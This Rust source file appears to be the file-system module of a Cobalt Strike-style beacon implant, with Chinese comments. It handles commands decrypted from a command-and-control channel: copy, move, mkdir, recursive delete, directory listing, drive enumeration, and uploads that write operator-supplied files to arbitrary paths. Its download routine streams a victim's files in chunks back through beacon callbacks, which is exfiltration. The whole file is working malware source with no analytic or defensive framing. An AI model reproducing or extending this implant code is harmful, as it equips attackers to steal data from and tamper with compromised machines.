use crate::util::jobs::CALLBACK_FILE;
use crate::util::jobs::CALLBACK_FILE_CLOSE;
use crate::util::jobs::CALLBACK_FILE_WRITE;
use crate::util::jobs::CALLBACK_PENDING;
use anyhow::Error;
use chrono::{DateTime, Local};
use std::fs::{File, OpenOptions};
use std::io::{Cursor, ErrorKind, Read, Write};
use std::path::Path;
use std::time::SystemTime;
use std::{fs, io, thread};
use windows_sys::Win32::Storage::FileSystem::GetLogicalDrives;

static mut FILE_COUNTER: u32 = 0;

use crate::util::data_parse::{
    beacon_read_bytes, beacon_read_i32, beacon_read_length_and_string, beacon_send_result,
};

use crate::util::jobs::CALLBACK_OUTPUT;
use crate::{BEACON, COUNTER};

pub fn cp(mut decrypted_cursor: Cursor<Vec<u8>>) {
    let _cmd_len = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let (_, source) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    let (_, destination) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();

    let source = String::from_utf8_lossy(&source);
    let destination = String::from_utf8_lossy(&destination);

    // 将 source 和 destination 转换为 &str，再传递给 fs::copy
    match fs::copy(&*source, &*destination) {
        Ok(_) => unsafe {
            beacon_send_result(b"cp OK", &BEACON, CALLBACK_OUTPUT);
        },
        Err(e) => {
            let error_message = match e.kind() {
                ErrorKind::NotFound => "NotFound",
                ErrorKind::PermissionDenied => "PermissionDenied",
                ErrorKind::AlreadyExists => "AlreadyExists",
                _ => "UnknownError",
            };

            // 创建一个新的 Vec<u8> 来存储连接后的字节数组
            let mut full_message = b"error: ".to_vec();
            full_message.extend_from_slice(error_message.as_bytes());

            unsafe {
                // 调用 beacon_send_result 发送错误信息
                beacon_send_result(&full_message, &BEACON, CALLBACK_OUTPUT);
            }

            eprintln!("错误：{}", error_message);
        }
    }
}

pub fn mv(mut decrypted_cursor: Cursor<Vec<u8>>) {
    let _cmd_len = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let (_, source) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    let (_, destination) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();

    let source = String::from_utf8_lossy(&source);
    let destination = String::from_utf8_lossy(&destination);

    match fs::rename(&*source, &*destination) {
        Ok(_) => unsafe {
            beacon_send_result(b"mv OK", &BEACON, CALLBACK_OUTPUT);
        },
        Err(e) => {
            let error_message = match e.kind() {
                ErrorKind::NotFound => "NotFound",
                ErrorKind::PermissionDenied => "PermissionDenied",
                ErrorKind::AlreadyExists => "AlreadyExists",
                _ => "UnknownError",
            };

            // 创建一个新的 Vec<u8> 来存储连接后的字节数组
            let mut full_message = b"error: ".to_vec();
            full_message.extend_from_slice(error_message.as_bytes());

            unsafe {
                // 调用 beacon_send_result 发送错误信息
                beacon_send_result(&full_message, &BEACON, CALLBACK_OUTPUT).unwrap();
            }

            eprintln!("错误：{}", error_message);
        }
    }
}

pub fn mkdir(mut decrypted_cursor: Cursor<Vec<u8>>) {
    let (_, dir_path) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    let dir_path = String::from_utf8_lossy(&dir_path);

    unsafe {
        match fs::create_dir_all(&*dir_path) {
            Ok(_) => beacon_send_result(b"mkdir OK", &BEACON, CALLBACK_OUTPUT).unwrap(),
            Err(e) => {
                let mut full_message = b"error: ".to_vec();
                let error_message = format!("{}", e);
                // 将 e 转换为字符串
                full_message.extend_from_slice(error_message.as_bytes());
                beacon_send_result(&full_message, &BEACON, CALLBACK_OUTPUT).unwrap();
                eprintln!("创建目录失败：{}", e);
            }
        }
    }
}

pub fn rm(mut decrypted_cursor: Cursor<Vec<u8>>) {
    let (_, path) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    let path = String::from_utf8_lossy(&path);

    let path = Path::new(&*path);

    // 判断路径是否存在
    if !path.exists() {
        let err_message = "路径不存在";
        eprintln!("删除路径失败: {}", err_message);
        unsafe {
            beacon_send_result(err_message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
        }
        return;
    }

    // 尝试删除路径
    let result = if path.is_file() {
        // 如果是文件，直接删除
        fs::remove_file(path)
    } else if path.is_dir() {
        // 如果是目录，则递归删除其内容后删除目录本身
        for entry in fs::read_dir(path).unwrap() {
            let entry = entry.unwrap();
            let entry_path = entry.path();

            // 递归删除
            if let Err(e) = fs::remove_file(&entry_path) {
                eprintln!("删除文件失败: {}", e);
                return;
            }
        }
        // 删除空目录
        fs::remove_dir(path)
    } else {
        Err(io::Error::new(io::ErrorKind::Other, "未知文件类型"))
    };

    // 根据删除结果做出相应处理
    match result {
        Ok(_) => {
            println!("路径删除成功: {}", path.display());
            unsafe {
                beacon_send_result(b"rm OK", &BEACON, CALLBACK_OUTPUT).unwrap();
            }
        }
        Err(e) => {
            let mut full_message = b"error: ".to_vec();
            let error_message = format!("{}", e);
            full_message.extend_from_slice(error_message.as_bytes());
            unsafe {
                beacon_send_result(&full_message, &BEACON, CALLBACK_OUTPUT);
            }
            eprintln!("删除路径失败: {}", e);
        }
    }
}

pub fn file_browse(mut decrypted_cursor: Cursor<Vec<u8>>) {
    let _cmd_len = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let pending_request_bytes = beacon_read_i32(&mut decrypted_cursor)
        .unwrap()
        .to_be_bytes();

    // 读取 dir_path_bytes
    let (_, dir_path_bytes) = match beacon_read_length_and_string(&mut decrypted_cursor) {
        Ok(result) => result,
        Err(e) => {
            eprintln!("Error reading dir_path_bytes: {}", e);
            return;
        }
    };

    // 处理目录路径
    let mut dir_path_str = String::from_utf8_lossy(&dir_path_bytes).to_string();
    dir_path_str = dir_path_str
        .replace("\\", "/")
        .trim_end_matches('*')
        .to_string();
    if dir_path_str.starts_with('/') {
        dir_path_str = format!("./{}", dir_path_str.trim_start_matches('/'));
    }

    let dir_path = match Path::new(&dir_path_str).canonicalize() {
        Ok(path) => path,
        Err(e) => {
            eprintln!("Error canonicalizing path: {}", e);
            return;
        }
    };

    println!("Canonicalized path: {}", dir_path.display());

    // 检查路径是否存在
    let dir_info = match fs::metadata(&dir_path) {
        Ok(info) => info,
        Err(e) => {
            eprintln!("Error getting metadata for path: {}", e);
            return;
        }
    };

    // 处理修改时间
    let mod_time_str = match dir_info.modified() {
        Ok(modified_time) => match format_system_time(modified_time) {
            Ok(time_str) => time_str,
            Err(e) => {
                eprintln!("Error formatting modification time: {}", e);
                return;
            }
        },
        Err(e) => {
            eprintln!("Error getting modification time: {}", e);
            return;
        }
    };

    // 处理路径字符串
    let clean_path = if cfg!(target_os = "windows") {
        dir_path
            .display()
            .to_string()
            .trim_start_matches(r"\\?\")
            .to_string()
    } else {
        dir_path.display().to_string().replace("/", "\\")
    };

    // 初始化结果 Vec<u8>
    let mut result_bytes = Vec::new();
    let path_prefix = if cfg!(target_os = "windows") {
        format!("{}\\*", clean_path)
    } else {
        format!("/{}/*", clean_path)
    };

    result_bytes.extend_from_slice(path_prefix.as_bytes());

    // 添加当前目录和父目录信息
    result_bytes.extend_from_slice(format!("\nD\t0\t{}\t.", mod_time_str).as_bytes());
    result_bytes.extend_from_slice(format!("\nD\t0\t{}\t..", mod_time_str).as_bytes());

    // 读取目录中的文件和文件夹
    match fs::read_dir(&dir_path) {
        Ok(entries) => {
            for entry in entries {
                match entry {
                    Ok(entry) => {
                        let entry_path = entry.path();
                        let file_info = match fs::metadata(&entry_path) {
                            Ok(info) => info,
                            Err(e) => {
                                eprintln!("Error getting file metadata: {}", e);
                                continue;
                            }
                        };

                        let mod_time_str = match file_info.modified() {
                            Ok(modified_time) => match format_system_time(modified_time) {
                                Ok(time_str) => time_str,
                                Err(e) => {
                                    eprintln!("Error formatting modification time: {}", e);
                                    continue;
                                }
                            },
                            Err(e) => {
                                eprintln!("Error getting modification time: {}", e);
                                continue;
                            }
                        };

                        let file_name_bytes = entry.file_name().into_encoded_bytes();

                        let entry_type = if file_info.file_type().is_symlink() {
                            if let Ok(link_path) = fs::read_link(&entry_path) {
                                if fs::metadata(&link_path)
                                    .map_or(false, |target_info| target_info.is_dir())
                                {
                                    "D"
                                } else {
                                    "F"
                                }
                            } else {
                                "F"
                            }
                        } else if file_info.is_dir() {
                            "D"
                        } else {
                            "F"
                        };

                        let file_entry =
                            format!("\n{}\t{}\t{}\t", entry_type, file_info.len(), mod_time_str);
                        result_bytes.extend_from_slice(file_entry.as_bytes());
                        result_bytes.extend_from_slice(&file_name_bytes);
                    }
                    Err(e) => {
                        eprintln!("Error reading directory entry: {}", e);
                    }
                }
            }
        }
        Err(e) => {
            eprintln!("Error reading directory: {}", e);
            return;
        }
    }

    // 组合结果并推送
    let dir_result = [pending_request_bytes.to_vec(), result_bytes].concat();
    unsafe { beacon_send_result(&dir_result, &BEACON, CALLBACK_PENDING).unwrap() }
}
// 格式化系统时间
fn format_system_time(system_time: SystemTime) -> Result<String, Box<dyn std::error::Error>> {
    let datetime: DateTime<Local> = system_time.into();
    Ok(datetime.format("%d/%m/%Y %H:%M:%S").to_string())
}

pub fn upload(mut decrypted_cursor: Cursor<Vec<u8>>, start: bool) {
    let cmd_len = beacon_read_i32(&mut decrypted_cursor).unwrap();

    let (file_path_len, file_path_byte) = match beacon_read_length_and_string(&mut decrypted_cursor)
    {
        Ok(result) => result,
        Err(e) => {
            eprintln!("Error reading dir_path_bytes: {}", e);
            return;
        }
    };
    let file_content_len = cmd_len - file_path_len as i32 - 4;
    let file_content_byte =
        beacon_read_bytes(&mut decrypted_cursor, file_content_len as usize).unwrap();

    // 将文件路径转换为字符串
    let file_path = String::from_utf8(file_path_byte).unwrap();

    // 统一路径格式（将 Windows 路径分隔符转换为 Unix 风格）
    let file_path = file_path.replace("\\", "/");

    // 打开文件，视 `start` 标志决定是创建文件还是追加内容
    let file = if start {
        OpenOptions::new()
            .create(true)
            .write(true)
            .truncate(true)
            .open(&file_path)
            .expect("Failed to create or open the file")
    } else {
        OpenOptions::new()
            .append(true)
            .write(true)
            .open(&file_path)
            .expect("Failed to open file in append mode")
    };

    let mut file = file;
    file.write_all(&*file_content_byte)
        .expect("Failed to write to file");

    //刷新file_browser
}

pub fn download(mut decrypted_cursor: Cursor<Vec<u8>>) {
    let (_, file_path_byte) = match beacon_read_length_and_string(&mut decrypted_cursor) {
        Ok(result) => result,
        Err(e) => {
            eprintln!("Error reading dir_path_bytes: {}", e);
            return;
        }
    };
    let file_path = String::from_utf8_lossy(&file_path_byte);
    // 转换为 `String`，拥有所有权
    let file_path_string = file_path.to_string();
    let mut result = Vec::new();
    result.extend_from_slice(b"[+] Downloading ");
    result.extend_from_slice(&file_path_byte);
    beacon_send_result(&result, &BEACON, CALLBACK_OUTPUT);

    let handle = thread::spawn(move || unsafe {
        if let Err(e) = my_thread_function(file_path_string) {
            eprintln!("Error: {:?}", e);
        }
    });
    // 取消注释就变成会等待
    // match handle.join() {
    //     Ok(_) => println!("download completed successfully"),
    //     Err(e) => eprintln!("download encountered an error: {:?}", e),
    // }
}

unsafe fn my_thread_function(file_path: String) -> Result<(), Error> {
    let file_path = file_path.replace("\\", "/");
    let mut file = File::open(&file_path)?;

    // 在发送内容之前先发送 requestID, 文件大小, filePath
    let mut request_id = FILE_COUNTER; // 示例请求 ID
    FILE_COUNTER = FILE_COUNTER + 1;
    let metadata = file.metadata()?;
    let file_len = metadata.len() as u32;

    let mut first_back = Vec::new();
    first_back.extend_from_slice(&request_id.to_be_bytes()); // 添加请求 ID
    first_back.extend_from_slice(&file_len.to_be_bytes()); // 添加文件大小
    first_back.extend_from_slice(file_path.as_bytes()); // 使用 file_path 的引用
    beacon_send_result(&first_back, &BEACON, CALLBACK_FILE).unwrap();

    let mut buffer = vec![0u8; 1024 * 1024]; // 1MB 缓冲区

    loop {
        let bytes_read = file.read(&mut buffer)?;
        if bytes_read == 0 {
            break; // 文件读取结束
        }

        let request_id_bytes = request_id.to_be_bytes();

        let mut meta_info = Vec::new();
        meta_info.extend_from_slice(&request_id_bytes);
        meta_info.extend_from_slice(&buffer[..bytes_read]);

        beacon_send_result(&meta_info, &BEACON, CALLBACK_FILE_WRITE).unwrap();

        // 休眠 50 毫秒（模拟）
        thread::sleep(std::time::Duration::from_millis(50));
    }
    let mut finally_bytes = Vec::new();
    finally_bytes.extend_from_slice(&request_id.to_be_bytes());
    beacon_send_result(&finally_bytes, &BEACON, CALLBACK_FILE_CLOSE).unwrap();

    Ok(())
}

#[cfg(target_os = "windows")]
pub fn list_drives(mut decrypted_cursor: Cursor<Vec<u8>>) {
    let (_, file_path_byte) = match beacon_read_length_and_string(&mut decrypted_cursor) {
        Ok(result) => result,
        Err(e) => {
            eprintln!("Error reading dir_path_bytes: {}", e);
            return;
        }
    };
    let file_path = String::from_utf8_lossy(&file_path_byte);
    let file_path_string = file_path.to_string();

    // 调用 Windows API 获取逻辑驱动器的位掩码
    let bit_mask = unsafe { GetLogicalDrives() };
    if bit_mask == 0 {}

    // 将位掩码转换为字节
    let result = bit_mask.to_string();
    let result_bytes = result.as_bytes();

    // 创建需要返回的数据，将输入的前 4 个字节与 result 字节合并
    let mut combined_data = Vec::new();
    combined_data.extend_from_slice(&file_path_string.as_bytes()[0..4]);
    combined_data.extend_from_slice(result_bytes);

    beacon_send_result(&combined_data, &BEACON, CALLBACK_PENDING).unwrap()
}
